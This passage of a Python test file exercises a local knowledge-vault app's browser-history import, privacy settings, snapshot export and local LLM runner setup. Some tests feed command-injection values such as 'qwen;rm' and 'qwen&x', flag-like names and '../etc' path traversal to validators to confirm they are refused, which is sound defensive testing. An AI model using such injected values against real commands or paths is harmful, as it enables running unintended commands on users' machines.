    assert (c["days_written"], c["private_pages"], c["dropped"], c["local_model_used"]) == \
        (5, 5, 1, False)
    assert b"TITLEMARKER" not in raw + b"".join(seen)
    assert call(app, "POST", "/api/browse/import", {"sources": []})[0] == 400

    gate = threading.Event()

    def slow_run(v, srcs, settings, *, progress=None, **kw):
        progress(srcs[0].key, 1, 1, None)
        gate.wait(5)
        progress(srcs[0].key, 1, 1, None)  # Cancel is checked at each progress call
        raise AssertionError("not cancelled")

    monkeypatch.setattr(build, "run", slow_run)
    call(app, "POST", "/api/browse/import", {"sources": ["chrome/Default", "comet/Default"]})
    time.sleep(0.2)
    call(app, "POST", "/api/job/cancel", {})
    gate.set()
    job = wait_job(app)
    assert job["error"] is None and job["result"]["cancelled"]


def test_safe_keeps_numbers_and_dates_only():
    got = status.safe({"n": 3, "ok": True, "day": "2026-11-17", "t": "2026-11-17T10:00:00Z",
                       "title": "Chess TITLEMARKER", "url": "https://x.example/2026-11-17",
                       "nested": {"a": 1}})
    assert got == {"n": 3, "ok": True, "day": "2026-11-17", "t": "2026-11-17T10:00:00Z"}


def test_the_live_import_reads_new_history_quietly(app, vault, home, monkeypatch):
    """The app's live import (every 10 minutes): no job, only the browsers imported before,
    only after a first import, not with browse.auto_import_hours 0, not while a job runs or
    the browse lock is held, not without the search model. Whatever the last import's age."""
    from keepfold import semantic
    from keepfold.browse import build, sites, sources
    monkeypatch.setattr(sources, "discover", lambda *a, **k: [
        sources.Source("chrome", "Default", home / "a"),
        sources.Source("comet", "Default", home / "b")])
    monkeypatch.setattr(semantic, "load_embedder", lambda *a, **k: lambda texts: None)
    runs = []
    monkeypatch.setattr(build, "run", lambda v, srcs, settings, **kw: runs.append(
        sorted(s.key for s in srcs)) or {"sources": len(srcs)})
    cfg = home / ".keepfold" / "config.yaml"
    cfg.parent.mkdir(exist_ok=True)
    cfg.write_text("browse: {}\n", encoding="utf-8")  # no browsers filter: every one found
    assert app.auto_import() is None  # never imported: the first import is the user's
    state = vault / build.STATE
    state.parent.mkdir(parents=True, exist_ok=True)
    old = (datetime.now(UTC) - timedelta(hours=7)).strftime("%Y-%m-%dT%H:%M:%SZ")
    state.write_text(json.dumps({"last_run": old}), encoding="utf-8")
    assert app.auto_import() is None  # no browser imported before: none is read unasked
    # the user ticked only comet in the import dialog: chrome stays unread though found
    state.write_text(json.dumps({"last_run": old, "sources": {"comet/Default": {"cursor": 1}}}),
                     encoding="utf-8")
    gate = threading.Event()
    app.jobs.start("Something else", "vault", lambda job: gate.wait(5))
    assert app.auto_import() is None  # another job runs
    gate.set()
    wait_job(app)
    with sites.busy(_vault(vault)):
        assert app.auto_import() is None  # a forget or deepen holds the browse lock
    cfg.write_text("browse:\n  auto_import_hours: 0\n", encoding="utf-8")
    assert app.auto_import() is None
    cfg.write_text("browse: {}\n", encoding="utf-8")
    from keepfold.app import status
    real = status.embedding
    monkeypatch.setattr(status, "embedding", lambda: {**real(), "downloaded": False})
    assert app.auto_import() is None  # no search model: the job would only stop at once
    monkeypatch.setattr(status, "embedding", lambda: {**real(), "downloaded": True})
    state.write_text(json.dumps({"last_run": datetime.now(UTC).strftime("%Y-%m-%dT%H:%M:%SZ"),
                                 "sources": {"comet/Default": {"cursor": 1}}}), encoding="utf-8")
    got = app.auto_import()  # a minute-old import: live all the same, and no job of its own
    assert got["live"]["sources"] == 1 and runs == [["comet/Default"]]
    assert app.jobs.cur.name == "Something else"


def test_an_untick_at_import_keeps_the_profile_out_of_automatic_imports(app, vault, home,
                                                                        monkeypatch):
    """The import request's unticked keys go to browse.skip_profiles (other browse keys kept),
    the history list sends them as skip, auto_sources leaves them out; ticking again clears."""
    from keepfold import browse_serve
    from keepfold.browse import build, sources
    from keepfold.vault import Vault
    monkeypatch.setattr(sources, "discover", lambda *a, **k: [
        sources.Source("chrome", "Default", home / "a"),
        sources.Source("comet", "Default", home / "b")])
    cfg = home / ".keepfold" / "config.yaml"
    cfg.parent.mkdir(exist_ok=True)
    cfg.write_text("browse:\n  auto_import_hours: 3\n", encoding="utf-8")
    state = vault / build.STATE
    state.parent.mkdir(parents=True, exist_ok=True)
    state.write_text(json.dumps({"sources": {"chrome/Default": {"cursor": 1},
                                             "comet/Default": {"cursor": 1}}}), encoding="utf-8")
    assert call(app, "POST", "/api/browse/import",
                {"sources": ["comet/Default"], "skip": "chrome/Default"})[0] == 400
    call(app, "POST", "/api/browse/import", {"sources": ["comet/Default"],
                                             "skip": ["chrome/Default"]})
    wait_job(app)  # no search model: the job stops first; the choice is saved all the same
    b = status.config()["browse"]
    assert b == {"auto_import_hours": 3, "skip_profiles": ["chrome/Default"]}
    _, got, _, _ = call(app, "GET", "/api/browse")
    assert [(s["key"], s["skip"]) for s in got["history"]["sources"]] == \
        [("chrome/Default", True), ("comet/Default", False)]
    assert [s.key for s in browse_serve.auto_sources(Vault(vault))] == ["comet/Default"]
    call(app, "POST", "/api/browse/import", {"sources": ["comet/Default"], "from": "browse"})
    wait_job(app)  # Status's button sends no skip: the saved unticks stay
    assert status.config()["browse"]["skip_profiles"] == ["chrome/Default"]
    call(app, "POST", "/api/browse/import", {"sources": ["chrome/Default", "comet/Default"],
                                             "skip": []})
    wait_job(app)
    assert status.config()["browse"]["skip_profiles"] == []
    assert [s.key for s in browse_serve.auto_sources(Vault(vault))] == \
        ["chrome/Default", "comet/Default"]


def test_process_now_reads_only_the_automatic_imports_profiles(vault, home, monkeypatch):
    """The app's Process now does what the popup's button does: only the profiles imported
    before, never one unticked or never ticked."""
    from keepfold import browse_serve
    from keepfold.browse import build, sources
    monkeypatch.setattr(sources, "discover", lambda *a, **k: [
        sources.Source(b, "Default", home / b) for b in ("chrome", "comet", "edge")])
    cfg = home / ".keepfold" / "config.yaml"
    cfg.parent.mkdir(exist_ok=True)
    cfg.write_text("browse:\n  skip_profiles: [comet/Default]\n", encoding="utf-8")
    state = vault / build.STATE
    state.parent.mkdir(parents=True, exist_ok=True)
    state.write_text(json.dumps({"sources": {"chrome/Default": {}, "comet/Default": {}}}),
                     encoding="utf-8")
    got = []
    monkeypatch.setattr(browse_serve, "run_import", lambda v, srcs=None: got.append(
        [s.key for s in srcs]) or {})
    actions.browse_process(server.Job("p", "browse", False), vault)
    assert got == [["chrome/Default"]]


def _vault(root):
    from keepfold.vault import Vault
    return Vault(root)


def test_auto_import_setting_saved_and_checked(app, home):
    assert call(app, "GET", "/api/browse")[1]["settings"]["auto_import_hours"] == 6
    assert call(app, "POST", "/api/browse/auto", {"hours": 12})[0] == 200
    from keepfold import taint
    assert taint.config()["browse"]["auto_import_hours"] == 12
    assert call(app, "GET", "/api/browse")[1]["settings"]["auto_import_hours"] == 12
    assert call(app, "POST", "/api/browse/auto", {"hours": 0})[0] == 200
    for bad in (-1, 169, "6", True, None):
        assert call(app, "POST", "/api/browse/auto", {"hours": bad})[0] == 400
    assert taint.config()["browse"]["auto_import_hours"] == 0
    assert call(app, "POST", "/api/browse/auto", {"hours": 6}, token="wrong")[0] == 401


def test_the_extension_routes_are_gone(app, vault):
    """0.3.2 removed the capture extension: no pairing, in-app receiver or setup route."""
    for path in ("/api/browse/pair", "/api/browse/receiver", "/api/browse/setup"):
        assert call(app, "POST", path, {"on": True})[0] == 404, path
    assert call(app, "POST", "/api/open", {"what": "extension"})[0] == 400
    assert not (vault / ".keepfold" / "browse" / "token").exists()


def test_browse_settings_saved_and_checked(app, home):
    body = {"visible_to_claude": False, "adult": "private", "sensitive": "private",
            "deny": "a.example\nB.example", "allow": [], "private": ["c.example"]}
    assert call(app, "POST", "/api/browse/settings", body)[0] == 200
    from keepfold import taint
    b = taint.config()["browse"]
    assert b["deny_domains"] == ["a.example", "b.example"] and b["adult"] == "private"
    assert call(app, "POST", "/api/browse/settings", {**body, "adult": "x"})[0] == 400
    assert call(app, "POST", "/api/browse/settings", {**body, "deny": "a b/c"})[0] == 400


# ---- dashboard and vault, open --------------------------------------------------------------


def test_vault_actions(app, vault, fakes):
    call(app, "POST", "/api/vault/doctor", {})
    job = wait_job(app)
    assert job["error"] is None and any("Python" in x for x in job["result"]["lines"])
    call(app, "POST", "/api/vault/backup", {})
    job = wait_job(app)
    assert job["result"]["ok"] and list((Path.home() / ".keepfold" / "backups").glob("*/*.zip"))
    assert call(app, "POST", "/api/open", {"what": "vault"})[0] == 200
    assert fakes[-1][1].startswith("obsidian://open?path=")
    assert call(app, "POST", "/api/open", {"what": "../etc"})[0] == 400
    assert call(app, "POST", "/api/open", {"what": "dashboard"})[0] == 400  # Export snapshot now


def test_export_snapshot_downloads_in_the_browser_and_saves_by_dialog_in_the_window(
        app, vault, monkeypatch, tmp_path):
    from types import SimpleNamespace

    from conftest import note
    note(vault, "notes/private-thoughts.md",
         'id: "private-thoughts"\ntitle: "PRIVMARKER"\nprivate: true\n', "PRIVMARKER diary")
    assert call(app, "POST", "/api/vault/export", {})[1] == {"download": "/api/vault/snapshot"}
    code, _, raw, r = call(app, "GET", "/api/vault/snapshot")
    assert code == 200 and r.getheader("Content-Type").startswith("text/html")
    assert r.getheader("Content-Disposition") == f'attachment; filename="{server.snapshot_name()}"'
    assert b"default-src 'none'" in raw and b"PRIVMARKER" not in raw
    assert call(app, "GET", "/api/vault/snapshot", token=False)[0] == 401
    assert not (vault / ".keepfold" / "dashboard.html").exists()
    dest, asked = tmp_path / "out" / "snap.html", []
    dest.parent.mkdir()
    webview = SimpleNamespace(FileDialog=SimpleNamespace(SAVE=30))
    monkeypatch.setitem(__import__("sys").modules, "webview", webview)

    def dialog(kind, **kw):
        asked.append((kind, kw["save_filename"]))
        return str(dest) if len(asked) == 1 else None
    app.desktop = SimpleNamespace(win=SimpleNamespace(create_file_dialog=dialog))
    assert call(app, "POST", "/api/vault/export", {})[1]["job"] == "Exporting a snapshot"
    assert wait_job(app)["result"] == {"ok": True, "path": str(dest)}
    assert b"default-src 'none'" in dest.read_bytes()
    assert call(app, "POST", "/api/vault/export", {})[1] == {"cancelled": True}
    assert asked == [(30, server.snapshot_name())] * 2


def test_save_picture_downloads_in_the_browser_and_saves_by_dialog_in_the_window(
        app, vault, monkeypatch, tmp_path):
    """POST /api/brain/picture: the browser app downloads the PNG itself; the desktop window
    asks where (Downloads first, keepfold-brain-<day>.png) and writes only there; a bad payload,
    a non-PNG and one over 8 MB are refused with one sentence; no key, no picture."""
    import base64
    from types import SimpleNamespace
    png = b"\x89PNG\r\n\x1a\n" + b"\x00" * 64
    body = {"png": base64.b64encode(png).decode(), "day": "2026-11-24"}
    before = snapshot(vault)
    assert call(app, "POST", "/api/brain/picture", body)[:2] == (200, {"download": True})
    refused = (400, {"error": "That picture could not be saved."})
    over = b"\x89PNG\r\n\x1a\n" + b"\x00" * server.PICTURE_MAX
    for bad in ({}, {"png": 5}, {"png": "not base64!"},
                {"png": base64.b64encode(b"GIF89a").decode()},
                {"png": base64.b64encode(over).decode()}):
        assert call(app, "POST", "/api/brain/picture", bad)[:2] == refused, list(bad)
    assert call(app, "POST", "/api/brain/picture", body, token=False)[0] == 401
    downloads, dest, asked = tmp_path / "dl", tmp_path / "chosen" / "mine.png", []
    downloads.mkdir()
    dest.parent.mkdir()
    monkeypatch.setenv("KEEPFOLD_DOWNLOADS_DIR", str(downloads))
    monkeypatch.setitem(__import__("sys").modules, "webview",
                        SimpleNamespace(FileDialog=SimpleNamespace(SAVE=30)))

    def dialog(kind, **kw):
        asked.append((kind, kw["directory"], kw["save_filename"]))
        return [str(dest)] if len(asked) == 1 else None
    app.desktop = SimpleNamespace(win=SimpleNamespace(create_file_dialog=dialog))
    assert call(app, "POST", "/api/brain/picture", body)[:2] == (200, {"saved": "mine.png"})
    assert dest.read_bytes() == png
    assert call(app, "POST", "/api/brain/picture", body)[:2] == (200, {"cancelled": True})
    assert asked == [(30, str(downloads), "keepfold-brain-2026-11-24.png")] * 2
    assert list(downloads.iterdir()) == [] and snapshot(vault) == before  # nothing else written
    odd_day = {**body, "day": "../x"}
    assert call(app, "POST", "/api/brain/picture", odd_day)[:2] == (200, {"cancelled": True})
    assert asked[-1][2] == f"keepfold-brain-{time.strftime('%Y-%m-%d')}.png"


def test_llm_page_lists_both_runners_chat_models_and_the_recommendation(app, monkeypatch):
    """Ollama and LM Studio models, embedding models left out by the chat's rule, and the
    model Setup would recommend for this computer."""
    monkeypatch.setattr(status, "ollama_models", lambda: ["nomic-embed-text:latest", "qwen3.5:4b"])
    monkeypatch.setattr(status, "lms_models", lambda: [
        {"key": "qwen/qwen3.5-2b", "name": "Qwen", "size": None, "params": ""},
        {"key": "text-embedding-bge-small", "name": "BGE", "size": None, "params": ""}])
    monkeypatch.setattr(wizard, "hardware", lambda: {"kind": "gpu", "gb": 8.0, "label": "8 GB"})
    _, llm, _, _ = call(app, "GET", "/api/llm")
    assert llm["ollama"] == ["qwen3.5:4b"]
    assert [m["key"] for m in llm["models"]] == ["qwen/qwen3.5-2b"]
    assert llm["hardware"]["gb"] == 8.0 and llm["recommend"]["ollama"] == "qwen3.5:4b"


def test_llm_settings_store_the_runner(app):
    from keepfold import taint

    def saved():
        c = taint.config()["localllm"]
        return c.get("model"), c.get("runner")

    assert call(app, "POST", "/api/llm/settings", {"model": "qwen3.5:4b",
                                                   "runner": "ollama"})[0] == 200
    assert saved() == ("qwen3.5:4b", "ollama")
    assert call(app, "POST", "/api/llm/settings", {"model": "qwen/qwen3.5-2b",
                                                   "runner": "lmstudio"})[0] == 200
    assert saved() == ("qwen/qwen3.5-2b", "lmstudio")
    call(app, "POST", "/api/llm/settings", {"model": "qwen3.5:4b", "runner": "ollama"})
    assert call(app, "POST", "/api/llm/settings", {"model": "gemma3:2b"})[0] == 200
    assert saved() == ("gemma3:2b", "lmstudio")  # no runner: an LM Studio choice, as before
    for bad in ({"model": "gemma3:2b", "runner": "openai"}, {"model": "x", "runner": None},
                {"model": "bad name", "runner": "ollama"}):
        assert call(app, "POST", "/api/llm/settings", bad)[0] == 400, bad
    assert saved() == ("gemma3:2b", "lmstudio")
    assert call(app, "POST", "/api/llm/settings", {"background_model": "qwen3.5:9b"})[0] == 200
    assert taint.config()["localllm"]["background_model"] == "qwen3.5:9b"
    assert saved() == ("gemma3:2b", "lmstudio")  # the main choice is left alone
    assert call(app, "POST", "/api/llm/settings", {"background_model": "bad name"})[0] == 400
    assert call(app, "POST", "/api/llm/settings", {"background_model": ""})[0] == 200
    assert "background_model" not in taint.config()["localllm"]


@pytest.mark.parametrize("name", ["qwen3.5:4b", "gemma3:2b", "library/qwen3:8b",
                                  "someone/my-model:q4_k_m", "llama3.2", "qwen3.5:4b-q4_K_M",
                                  "a" * 100])
def test_pull_name_accepted(name):
    assert wizard.ollama_name(name) == name


@pytest.mark.parametrize("name", [
    "qwen3.5 4b", " qwen3.5:4b", "qwen3.5:4b\n", "https://ollama.com/library/qwen3",
    "ollama.com/qwen3", "a/b/c", "-flag", "--insecure", "Qwen3.5:4b", "qwen3:-Q4",
    "qwen;rm", "qwen&x", 'q"x', "a" * 101, "", None, 5, "gpt-oss:120b-cloud",
    "deepseek-v3.1:671b-cloud", "qwen3:cloud"])
def test_pull_name_refused(name):
    with pytest.raises(ValueError):
        wizard.ollama_name(name)


def test_llm_pull_runs_ollama_pull_with_the_name(app, monkeypatch):
    started = []
    monkeypatch.setattr(actions, "_popen", lambda args, **k: (
        started.append(args), FakeProc(b"pulling 50%\rsuccess\n"))[1])
    monkeypatch.setattr(wizard, "ollama_size", lambda name: 10**9)  # never ollama.com
    monkeypatch.setattr(wizard, "free_space_ok", lambda p, n: (True, ""))
    assert call(app, "POST", "/api/llm/pull", {"name": "-x"})[0] == 400
    assert call(app, "POST", "/api/llm/pull", {"name": "gpt-oss:20b-cloud"})[0] == 400
    call(app, "POST", "/api/llm/pull", {"name": "gemma3:2b"})  # not installed
    assert "not installed" in wait_job(app)["error"] and started == []
    monkeypatch.setattr(targets, "_which", lambda c: "C:\\o\\ollama.exe" if c == "ollama"
                        else None)
    call(app, "POST", "/api/llm/pull", {"name": "gemma3:2b"})  # installed, not answering
    assert wizard.STOPPED.format("Ollama") in wait_job(app)["error"] and started == []
    monkeypatch.setattr(status, "ollama_models", lambda: [])
    call(app, "POST", "/api/llm/pull", {"name": "gemma3:2b"})
    job = wait_job(app)
    assert started == [["C:\\o\\ollama.exe", "pull", "gemma3:2b"]]
    assert job["section"] == "llm" and job["cancellable"] and job["result"]["ok"]


def test_one_job_at_a_time(app):
    gate = threading.Event()
    app.jobs.start("slow", "vault", lambda job: gate.wait(5))
    code, body, _, _ = call(app, "POST", "/api/vault/backup", {})
    assert code == 409 and "slow" in body["error"]
    gate.set()
    wait_job(app)


# ---- Setup ----------------------------------------------------------------------------------


def test_recommendation_by_memory(monkeypatch):
    assert [wizard.recommend(g) for g in (None, 2, 4, 5.9, 6, 8, 9.9, 10, 24)] == \
        ["2b", "2b", "2b", "2b", "4b", "4b", "4b", "9b", "9b"]
    monkeypatch.setattr(targets, "_which", lambda c: "nvidia-smi")
    monkeypatch.setattr(targets, "_run", lambda a, timeout=0: (True, "8192\n6144\n"))
    wizard.hardware.cache_clear()  # probed once per app run
    assert wizard.hardware() == {"kind": "gpu", "gb": 8.0,
                                 "label": "8 GB of graphics memory (NVIDIA)"}
    monkeypatch.setattr(targets, "_which", lambda c: None)
    assert wizard.hardware()["kind"] == "gpu"  # cached
    # no Apple Silicon or AMD card either: a Mac runner's unified memory counts as graphics memory
    monkeypatch.setattr(wizard.platform, "machine", lambda: "x86_64")
    monkeypatch.setattr(wizard, "_amd_vram_gb", lambda: None)
    wizard.hardware.cache_clear()
    assert wizard.hardware()["kind"] == "ram"
    wizard.hardware.cache_clear()


class FakeProc:
    def __init__(self, out: bytes, block: bool = False):
        self.stopped = threading.Event()
        self.data, self.block, self.rc = io.BytesIO(out), block, 0
        self.stdout = self

    def read1(self, n):
        chunk = self.data.read(n)
        if not chunk and self.block:
            self.stopped.wait(10)
        return chunk

    def wait(self):
        return 1 if self.stopped.is_set() else self.rc

    def terminate(self):
        self.stopped.set()


def test_setup_pull_streams_progress_and_cancels(app, monkeypatch):
    started = []
    monkeypatch.setattr(targets, "_which", lambda c: "C:\\o\\ollama.exe" if c == "ollama"
                        else None)
    monkeypatch.setattr(actions, "_popen", lambda args, **k: (
        started.append(args), FakeProc(b"pulling 10%\rpulling 100%\r\nsuccess\n"))[1])
    call(app, "POST", "/api/setup/pull", {"model": "2b", "runner": "ollama"})  # not serving
    assert wizard.STOPPED.format("Ollama") in wait_job(app)["error"] and started == []
    monkeypatch.setattr(status, "ollama_models", lambda: [])
    call(app, "POST", "/api/setup/pull", {"model": "2b", "runner": "ollama"})
    job = wait_job(app)
    assert started == [["C:\\o\\ollama.exe", "pull", "qwen3.5:2b"]]
    assert job["result"]["ok"] and job["result"]["lines"][-1] == "success"
    proc = FakeProc(b"pulling 1%\n", block=True)
    monkeypatch.setattr(actions, "_popen", lambda args, **k: proc)
    call(app, "POST", "/api/setup/pull", {"model": "9b", "runner": "ollama"})
    time.sleep(0.2)
    call(app, "POST", "/api/job/cancel", {})
    job = wait_job(app)
    assert job["result"]["cancelled"] and not job["result"]["ok"]
    assert call(app, "POST", "/api/setup/pull", {"model": "70b", "runner": "ollama"})[0] == 400


def test_setup_install_runs_only_the_shown_command(app, monkeypatch):
    plan = wizard.install_plan()
    assert plan["size"] and plan["source"] and plan["page"].startswith("https://ollama.com")
    if plan.get("fetch"):
        pytest.skip("this platform downloads Ollama itself (tests/test_wizard.py covers it)")
    if plan["run"] is None:  # no winget/brew here: nothing to run
        assert call(app, "POST", "/api/setup/install", {})[0] == 200
        assert "yourself" in wait_job(app)["error"]
        return
    started = []
    monkeypatch.setattr(actions, "_popen", lambda args, **k: (started.append(args),
                                                              FakeProc(b"ok\n"))[1])
    call(app, "POST", "/api/setup/install", {})
    wait_job(app)
    assert started == [plan["run"]]


def test_setup_test_turns_the_model_on(app, monkeypatch):
    from keepfold import localllm, taint

    class Fake:
        def describe(self):
            return "ollama qwen3.5:4b at 127.0.0.1:11434"

        def classify(self, text, labels):
            assert text == actions.TEST_TEXT
            return "programming", 0.9

    seen = []
    monkeypatch.setattr(localllm, "find", lambda config=None, **_: (seen.append(config), Fake())[1])
    call(app, "POST", "/api/setup/test", {"model": "4b", "runner": "ollama"})
    job = wait_job(app)
    assert job["error"] is None and job["result"]["answer"] == "programming"
    assert seen[0]["localllm"]["enabled"] is True
    assert taint.config()["localllm"] == {"enabled": True, "model": "qwen3.5:4b",
                                          "runner": "ollama"}


def test_runner_states_and_a_stopped_test_says_start(app, monkeypatch):
    from keepfold import localllm

    assert wizard.runner_state("ollama") == "not_installed"
    assert wizard.runner_state("lmstudio") == "not_installed"
    monkeypatch.setattr(targets, "_which", lambda c: "C:\\o\\ollama.exe" if c == "ollama"
                        else None)
    assert wizard.runner_state("ollama") == "stopped"
    _, s, _, _ = call(app, "GET", "/api/setup")
    assert s["runner"]["ollama"]["state"] == "stopped" and not s["runner"]["done"]
    assert s["runner"]["recommend"] == "ollama"
    monkeypatch.setattr(localllm, "find", lambda config=None, **_: None)
    call(app, "POST", "/api/setup/test", {"model": "2b", "runner": "ollama"})
    assert wizard.STOPPED.format("Ollama") in wait_job(app)["error"]
    monkeypatch.setattr(status, "ollama_models", lambda: [])
    assert wizard.runner_state("ollama") == "running"
    assert call(app, "GET", "/api/setup")[1]["runner"]["done"]
    call(app, "POST", "/api/setup/test", {"model": "2b", "runner": "ollama"})
    assert "no local runner answered" in wait_job(app)["error"]  # running: the real error


def test_start_ollama_detached_then_waits_until_it_answers(monkeypatch, home):
    import sys

    started, serving = [], []
    monkeypatch.setattr(targets, "_which", lambda c: "C:\\o\\ollama.exe" if c == "ollama"
                        else None)
    monkeypatch.setattr(status, "ollama_models", lambda: [] if serving else None)
    monkeypatch.setattr(actions, "_popen", lambda args, **k: (
        started.append((args, k)), serving.append(1)))
    out = wizard.start("ollama")
    assert out["ok"] and out["state"] == "running"
    args, k = started[0]
    assert args == ["C:\\o\\ollama.exe", "serve"] and "env" not in k  # no OLLAMA_HOST of ours
    assert k["stdin"] == k["stdout"] == k["stderr"] == wizard.subprocess.DEVNULL
    assert k.get("creationflags") or k.get("start_new_session")
    assert wizard.start("ollama")["lines"] == ["Ollama is already running"]
    if sys.platform == "win32":  # the desktop app wins when installed
        app_exe = home / "LOCALAPPDATA" / "Programs" / "Ollama" / "ollama app.exe"
        app_exe.parent.mkdir(parents=True)
        app_exe.write_bytes(b"")
        serving.clear()
        wizard.start("ollama")
        assert started[-1][0] == [str(app_exe)]
    monkeypatch.setattr(targets, "_which", lambda c: None)
    serving.clear()
    with pytest.raises(ValueError, match="not installed"):
        wizard.start("ollama")


def test_start_lmstudio_runs_lms_server_start(monkeypatch, fakes):
    from keepfold import localllm

    ports = [None]
    monkeypatch.setattr(status, "lms_path", lambda: "C:\\lms\\lms.exe")
    monkeypatch.setattr(localllm, "lmstudio_state", lambda config=None: {
        "port": ports[-1], "loaded": []})
    monkeypatch.setattr(targets, "_run", lambda args, timeout=300: (
        fakes.append(list(args)), ports.append(1234), (True, "started"))[-1])
    assert wizard.runner_state("lmstudio") == "stopped"
    out = wizard.start("lmstudio")
    assert out["ok"] and fakes[-1] == ["C:\\lms\\lms.exe", "server", "start"]
    monkeypatch.setattr(targets, "_run", lambda args, timeout=300: (False, "boom"))
    ports.append(None)
    with pytest.raises(ValueError, match="lms server start"):
        wizard.start("lmstudio")
    with pytest.raises(ValueError, match="runner must be"):
        wizard.start("llamacpp")


@pytest.mark.parametrize("plat,systemd,rel,on_cmds", [
    ("darwin", False, "Library/LaunchAgents/keepfold-browse-receiver.plist",
     [["launchctl", "load", "-w"]]),
    ("linux", True, ".config/systemd/user/keepfold-browse-receiver.service",
     [["systemctl", "--user", "daemon-reload"],
      ["systemctl", "--user", "enable", "keepfold-browse-receiver.service"]]),
    ("linux", False, ".config/autostart/keepfold-browse-receiver.desktop", []),
])
def test_start_at_login_outside_windows(monkeypatch, home, fakes, plat, systemd, rel, on_cmds):
    """G6: a LaunchAgent, a systemd user unit, or an XDG autostart entry; shown first, written
    only by the click, and removed again."""
    import plistlib
    import sys
    from pathlib import PurePosixPath

    monkeypatch.setattr(sys, "platform", plat)
    monkeypatch.setattr(status, "_systemd", lambda: systemd)
    monkeypatch.delenv("XDG_CONFIG_HOME", raising=False)
    monkeypatch.setattr(targets, "_run", lambda args, timeout=300: (
        fakes.append(list(args)), (True, ""))[-1])
    root, f = PurePosixPath("/home/sam/my vault 100%"), home / rel
    assert status.login_task() == {"supported": True, "exists": False}
    shown = status.login_shown(root)
    assert str(f) in shown and status.login_text(root).strip() in shown and not f.exists()
    actions.login(type("Job", (), {"say": lambda self, s: None})(), root, True)
    text = f.read_text(encoding="utf-8")
    assert status.login_task() == {"supported": True, "exists": True}
    if plat == "darwin":
        p = plistlib.loads(f.read_bytes())
        assert p["Label"] == "keepfold-browse-receiver" and p["RunAtLoad"] is True
        assert p["ProgramArguments"][1:] == ["browse", "serve", "--vault", str(root)]
        on_cmds = [on_cmds[0] + [str(f)]]
    elif systemd:
        assert '"browse" "serve" "--vault" "/home/sam/my vault 100%%"\n' in text
        assert "ExecStart=" in text and "WantedBy=default.target" in text
    else:
        assert text.startswith("[Desktop Entry]\nType=Application\n")
        assert 'Exec="' in text and '"--vault" "/home/sam/my vault 100%%"\n' in text
    assert fakes == on_cmds
    fakes.clear()
    actions.login(type("Job", (), {"say": lambda self, s: None})(), root, False)
    assert not f.exists() and status.login_task()["exists"] is False
    assert [c[:3] for c in fakes] == ([["launchctl", "unload", "-w"]] if plat == "darwin" else
                                      [["systemctl", "--user", "disable"]] if systemd else [])


def test_setup_vault_creates_and_points(app, tmp_path, home):
    target = tmp_path / "new vault"
    call(app, "POST", "/api/setup/vault", {"path": str(target)})
    job = wait_job(app)
    assert job["error"] is None and (target / ".keepfold").is_dir()
    assert app.root == target.resolve()
    from keepfold import taint
    assert Path(taint.config()["vault"]) == target.resolve()
    code, out, _, _ = call(app, "POST", "/api/setup/vault", {"path": "relative/path"})
    assert code == 400 and "full path" in out["error"]  # refused before any job starts


def test_setup_vault_refuses_a_temp_folder_before_making_anything(app, vault, tmp_path, home,
                                                                  monkeypatch):
    """FX1 1: with a real vault in use, a temp folder is refused before `keepfold init` makes
    anything there; a first setup (no vault yet) may still use one (Status warns later)."""
    import tempfile

    from keepfold import cli, taint
    systemp = tmp_path / "systemp"
    systemp.mkdir()
    monkeypatch.setattr(tempfile, "gettempdir", lambda: str(systemp))
    cli._write_config(vault=str(vault))
    code, out, _, _ = call(app, "POST", "/api/setup/vault", {"path": str(systemp / "demo")})
    assert code == 400 and out["error"] == wizard.temp_refused()  # one message, no failed job
    assert str(systemp) not in out["error"]
    assert not (systemp / "demo").exists() and app.root == vault
    assert Path(taint.config()["vault"]) == vault
    taint.write_config({"vault": None})  # a new user: their only choice is not blocked
    out = wizard.make_vault(type("Job", (), {"say": lambda self, s: None})(),
                            str(systemp / "first"))[1]
    assert out["ok"] and (systemp / "first" / ".keepfold").is_dir()


def test_change_folder_leaves_another_installs_start_at_login_alone(
        app, vault, tmp_path, monkeypatch, _no_real_run_key):
    """A login entry this Keepfold did not make for the old folder (another install's receiver,
    or another vault) is never re-pointed by a vault move: a test copy once took over the
    owner's real entry this way."""
    monkeypatch.setattr(targets, "_which", lambda c: None)
    monkeypatch.setattr(status, "login_file", lambda: None)  # the Run key, as on Windows
    logins = []
    monkeypatch.setattr(actions, "login", lambda job, root, on: logins.append((root, on)))
    theirs = r'"C:\Program Files\Other\keepfold-receiver.exe" --vault "D:\TheirVault"'
    _no_real_run_key[status.LOGIN_TASK] = theirs
    call(app, "POST", "/api/setup/vault", {"path": str(tmp_path / "moved")})
    job = wait_job(app)
    assert job["error"] is None and logins == []
    assert _no_real_run_key[status.LOGIN_TASK] == theirs
    assert not status.login_is_for(vault)
    _no_real_run_key[status.LOGIN_TASK] = status.login_command(vault)
    assert status.login_is_for(vault)


def test_change_folder_asks_to_move_connected_apps_and_moves_start_at_login(
        app, vault, tmp_path, home, monkeypatch, _no_real_run_key):
    """FX1 6b/6c: after a real vault change the job says `reconnect` while an app still
    names the old folder (Connect's Apply moves it); Start at login is re-registered for the
    new vault (registration mocked). The same folder again changes nothing."""
    monkeypatch.setattr(targets, "_which", lambda c: None)
    monkeypatch.setattr(targets, "_run", lambda *a, **k: (False, "no runs in tests"))
    monkeypatch.setattr(status, "login_file", lambda: None)  # the Run key, as on Windows
    logins = []
    monkeypatch.setattr(actions, "login", lambda job, root, on: logins.append((root, on)))
    (home / ".codeium" / "windsurf").mkdir(parents=True)
    targets.apply_all({"windsurf": True}, app.entry())
    _no_real_run_key[status.LOGIN_TASK] = status.login_command(vault)
    call(app, "POST", "/api/setup/vault", {"path": str(vault)})  # the same folder
    job = wait_job(app)
    assert job["error"] is None and "reconnect" not in job["result"] and logins == []
    new = tmp_path / "new vault"
    call(app, "POST", "/api/setup/vault", {"path": str(new)})
    job = wait_job(app)
    assert job["error"] is None and job["result"]["reconnect"] is True
    assert logins == [(new.resolve(), True)]
    assert "Start at login now uses the new folder." in job["result"]["lines"]
    targets.apply_all({"windsurf": True}, app.entry())  # Connect's Apply
    call(app, "POST", "/api/setup/vault", {"path": str(vault)})  # back: windsurf names `new`
    assert wait_job(app)["result"]["reconnect"] is True


def test_setup_state_and_no_download_without_a_click(app, monkeypatch):
    _, s, _, _ = call(app, "GET", "/api/setup")
    assert s["vault"]["done"] and not s["embed"]["done"] and s["embed"]["size"]
    assert [m["id"] for m in s["model"]["options"]] == ["2b", "4b", "9b"]
    assert all(m["size"] and m["tradeoff"] for m in s["model"]["options"])
    assert s["model"]["recommend"] in ("2b", "4b", "9b")
    started = []
